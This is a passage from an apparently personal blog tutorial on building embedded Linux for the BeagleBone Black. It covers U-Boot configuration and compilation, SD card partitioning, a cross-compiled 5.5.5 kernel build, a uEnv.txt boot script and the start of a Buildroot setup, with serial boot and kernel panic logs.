emmet@homepc:/home/emmet/Documents/u-boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; u-boot-bb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;U-boot configuration is based on the Beaglebone Black’s processor i.e.AM335X Arm Cortex A8. Lots of configuration files for various boards can be found in the /configs directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/u-boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make &lt;span class=&quot;nv&quot;&gt;CROSS_COMPILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;arm-cortex_a8-linux-gnueabihf- am335x_evm_defconfig
emmet@homepc:/home/emmet/Documents/u-boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make menuconfig

&lt;span class=&quot;c&quot;&gt;#Modifications&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; delay &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;seconds before automatically booting &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;The amount of &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;we have to interrupt before its boot up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Command line interface  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;emmets_uboot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Shell prompt

Boot media  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Support &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;booting from SD/EMMC

&lt;span class=&quot;c&quot;&gt;#Disable falcon mode (CONFIG_SPL_OS_BOOT)&lt;/span&gt;
SPL / TPL  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Activate Falcon Mode 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;compile-u-boot&quot;&gt;Compile U-Boot&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/u-boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make &lt;span class=&quot;nv&quot;&gt;CROSS_COMPILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;arm-cortex_a8-linux-gnueabihf-
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once the build finishes, it will generate your secondary program loader (SPL) being the MLO file and the third program loader (TPL) files being the U-boot files. SPL is required to be loaded into SRAM from either flash memory, SD card or eMMC as its used as an intermediate stager to initialize main DRAM memory and then load U-Boot since SRAM can’t run a full bootloader due to memory constraints. We will be loading MLO and U-Boot from a 8GB SD card so its necessary to partition the SD card into two sections. Partition one which will hold our boot files while partition two will hold the root filesystem. I used a tool known as GParted for partitioning.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt; &lt;/th&gt;
      &lt;th&gt;Name&lt;/th&gt;
      &lt;th&gt;Size&lt;/th&gt;
      &lt;th&gt;Format&lt;/th&gt;
      &lt;th&gt;Flags&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Partition 1&lt;/td&gt;
      &lt;td&gt;boot&lt;/td&gt;
      &lt;td&gt;2GB&lt;/td&gt;
      &lt;td&gt;FAT32&lt;/td&gt;
      &lt;td&gt;boot, LBA&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Partition 2&lt;/td&gt;
      &lt;td&gt;rootfs&lt;/td&gt;
      &lt;td&gt;6GB&lt;/td&gt;
      &lt;td&gt;ext4&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Copy SPL and TPL files onto the boot partition, unmount device and insert SD card into board. Hold down the boot button before powering on the board otherwise the Beaglebone will boot from onboard eMMC storage.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/u-boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;MLO u-boot.img /media/emmet/BOOT
emmet@homepc:/home/emmet/Documents/u-boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sync
&lt;/span&gt;emmet@homepc:/home/emmet/Documents/u-boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;umount /media/emmet/BOOT 
emmet@homepc:/home/emmet/Documents/u-boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;umount /media/emmet/root
emmet@homepc:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;picocom &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; 115200 /dev/ttyUSB0 

U-Boot SPL 2020.04 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Jun 15 2020 - 15:29:01 +0100&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Trying to boot from MMC1


U-Boot 2020.04 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Jun 15 2020 - 15:29:01 +0100&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

CPU  : AM335X-GP rev 2.1
Model: TI AM335x BeagleBone Black
DRAM:  512 MiB
WDT:   Started with servicing &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;60s &lt;span class=&quot;nb&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
NAND:  0 MiB
MMC:   OMAP SD/MMC: 0, OMAP SD/MMC: 1
Loading Environment from FAT... &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; Warning - bad CRC, using default environment

&amp;lt;ethaddr&amp;gt; not set. Validating first E-fuse MAC
Net:   eth0: ethernet@4a100000
Warning: usb_ether MAC addresses dont match:
Address &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;ROM is          de:ad:be:ef:00:01
Address &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;environment is  0c:ae:7d:0c:4f:f4
 , eth1: usb_ether
Hit any key to stop autoboot:  0 
&lt;span class=&quot;nv&quot;&gt;emmets_uboot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-linux-kernel&quot;&gt;3. Linux Kernel&lt;/h1&gt;

&lt;p&gt;The Linux kernel is the core component of the operating system that is responsible for providing an interface to the user space via the C library, interfacing with the hardware using device drivers and lastly, managing resources such as memory, storage and the execution of tasks.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/embedded/bb-linux/kernel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;download-the-source-code&quot;&gt;Download the source code&lt;/h2&gt;
&lt;p&gt;The Linux Kernel main branch is managed by its creator, Linus Torvalds and you can download the source code from GitHub:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/
emmet@homepc:/home/emmet/Documents&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;linux/
emmet@homepc:/home/emmet/Documents/linux&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout v5.5.5
emmet@homepc:/home/emmet/Documents/linux&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; kernel-bb-5.5.5 &lt;span class=&quot;c&quot;&gt;# creates a local branch&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can find all the different kernel configuration files based on the architecture in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux/arch/&amp;lt;architecture&amp;gt;/configs&lt;/code&gt;. The Beaglebone Black is based on the ARM V7 architecture so the configuration we are going to use is: &lt;strong&gt;multi_v7_defconfig&lt;/strong&gt;. Clean the project before starting:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/linux&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make distclean
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;configure-and-build-the-kernel&quot;&gt;Configure and Build the kernel&lt;/h2&gt;
&lt;p&gt;Select the ARM V7 kernel configuration file and launch the menuconfig window. In the case of building the kernel, the architecture has to be expressed in addition to CROSS_COMPILE and the various types of architectures that can be supplied can be seen in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arch&lt;/code&gt; directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/linux&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make &lt;span class=&quot;nv&quot;&gt;ARCH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;arm &lt;span class=&quot;nv&quot;&gt;CROSS_COMPILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;arm-cortex_a8-linux-gnueabihf- multi_v7_defconfig
emmet@homepc:/home/emmet/Documents/linux&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make &lt;span class=&quot;nv&quot;&gt;ARCH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;arm menuconfig

&lt;span class=&quot;c&quot;&gt;#Modifications&lt;/span&gt;
General setup  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-emmetfriel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Local version - append to kernel release 
General setup  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;beaglebone-ef&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; Default &lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Build and compile the kernel:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/linux&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make &lt;span class=&quot;nv&quot;&gt;ARCH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;arm &lt;span class=&quot;nv&quot;&gt;CROSS_COMPILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;arm-cortex_a8-linux-gnueabihf- 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Check your new kernel release:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/linux&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make kernelrelease
5.5.5-emmetfriel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The output files are in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arch/arm/boot/&lt;/code&gt; directory. Copy the kernel image (zImage) and the device tree blob &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arch/arm/boot/dts/am335x-boneblack.dtb&lt;/code&gt; onto the boot partition of the SD card.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/linux/arch/arm/boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;zImage /media/emmet/BOOT
emmet@homepc:/home/emmet/Documents/linux/arch/arm/boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;dts/am335x-boneblack.dtb /media/emmet/BOOT
emmet@homepc:/home/emmet/Documents/linux/arch/arm/boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sync&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;predefining-boot-parameters-using-uenvtxt&quot;&gt;Predefining boot parameters using uEnv.txt&lt;/h2&gt;

&lt;p&gt;U-Boot supports using uEnv.txt which is a text file that declares and initializes boot variables before U-Boot runs bootcmd. Create a file uEnv.txt, insert the contents below and copy it onto the boot partition:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ttyS0,115200  
&lt;span class=&quot;nv&quot;&gt;ethaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;02:f8:7e:a6:fc:e1
&lt;span class=&quot;nv&quot;&gt;ipaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.1.1
&lt;span class=&quot;nv&quot;&gt;serverip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.1.10
&lt;span class=&quot;nv&quot;&gt;bootfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;zImage
&lt;span class=&quot;nv&quot;&gt;fdtfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;am335x-boneblack.dtb
&lt;span class=&quot;nv&quot;&gt;loadaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x80007fc0
&lt;span class=&quot;nv&quot;&gt;fdtaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x80F80000
&lt;span class=&quot;nv&quot;&gt;loadfdt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;fatload mmc 0:1 &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;fdtaddr&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;fdtfile&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;loaduimage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;fatload mmc 0:1 &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;loadaddr&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;bootfile&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;mmc_args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;setenv bootargs &lt;span class=&quot;nv&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;optargs&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/mmcblk0p2 &lt;span class=&quot;nv&quot;&gt;rootfstype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ext4
&lt;span class=&quot;nv&quot;&gt;fdtboot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;run mmc_args&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; bootz &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;loadaddr&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt; - &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;fdtaddr&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;uenvcmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mmc rescan&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; run loaduimage&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; run loadfdt&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; run fdtboot&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Insert SD card back into the beaglebone and test the kernel:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.348290] EXT4-fs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mmcblk0p2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: mounted filesystem with ordered data mode. Opts: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;null&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.356659] VFS: Mounted root &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ext4 filesystem&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;readonly &lt;/span&gt;on device 179:2.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.364781] devtmpfs: error mounting &lt;span class=&quot;nt&quot;&gt;-2&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.370319] Freeing unused kernel memory: 1024K
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.375558] Run /sbin/init as init process
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.379760] Run /etc/init as init process
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.383803] Run /bin/init as init process
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.387893] Run /bin/sh as init process
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.391757] Kernel panic - not syncing: No working init found.  Try passing &lt;span class=&quot;nv&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; option to kernel. See Linux Documentation/admin-guide/init.rst &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;guidance.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.405995] CPU: 0 PID: 1 Comm: swapper/0 Not tainted 5.5.5-emmetfriel &lt;span class=&quot;c&quot;&gt;#1&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.412809] Hardware name: Generic AM33XX &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Flattened Device Tree&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.418969] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&amp;lt;c03124e0&amp;gt;] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unwind_backtrace&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; from &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&amp;lt;c030c6dc&amp;gt;] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;show_stack+0x10/0x14&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.426758] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&amp;lt;c030c6dc&amp;gt;] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;show_stack&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; from &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&amp;lt;c0daa3e8&amp;gt;] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dump_stack+0xbc/0xd0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.434027] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&amp;lt;c0daa3e8&amp;gt;] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dump_stack&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; from &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&amp;lt;c0338e60&amp;gt;] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;panic+0x110/0x328&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.441026] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&amp;lt;c0338e60&amp;gt;] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;panic&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; from &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&amp;lt;c0dc1f50&amp;gt;] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kernel_init+0x108/0x110&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.448109] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&amp;lt;c0dc1f50&amp;gt;] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kernel_init&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; from &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&amp;lt;c03010e8&amp;gt;] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ret_from_fork+0x14/0x2c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.455709] Exception stack&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xdb0b1fb0 to 0xdb0b1ff8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.460782] 1fa0:                                     00000000 00000000 00000000 00000000
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.468997] 1fc0: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.477208] 1fe0: 00000000 00000000 00000000 00000000 00000013 00000000
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    2.483868] &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; end Kernel panic - not syncing: No working init found.  Try passing &lt;span class=&quot;nv&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; option to kernel. See Linux Documentation/admin-guide/init.rst &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;guidance. &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The kernel should hang or panic which is expected as there is no root filesystem on the SD card. The root filesystem will now be built using Buildroot.
&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;4-root-filesystem-buildroot&quot;&gt;4. Root Filesystem: Buildroot&lt;/h1&gt;

&lt;p&gt;Buildroot is an embedded Linux build system that supports many processors and architectures with the ability to generate a toolchain, root filesystem, Linux kernel and a bootloader. Since we have built our own toolchain, bootloader and kernel, Buildroot will be used to a create a minimal root filesystem that will include busybox and simple packages.&lt;/p&gt;

&lt;h2 id=&quot;clone-and-configure-buildroot&quot;&gt;Clone and Configure Buildroot&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone git://git.buildroot.net/buildroot
make beaglebone_defconfig
make menuconfig
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Modifications:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Configure buildroot to use our own toolchain instead of the built-in toolchain
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Toolchain  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Toolchain &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Custom toolchain&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
      &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/home/emmet/x-tools/arm-cortex_a8-linux-gnueabihf&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Toolchain path
     External toolchain gcc version &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9.x&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;→
     External toolchain kernel headers series &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.5.x&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Personalizing the OS
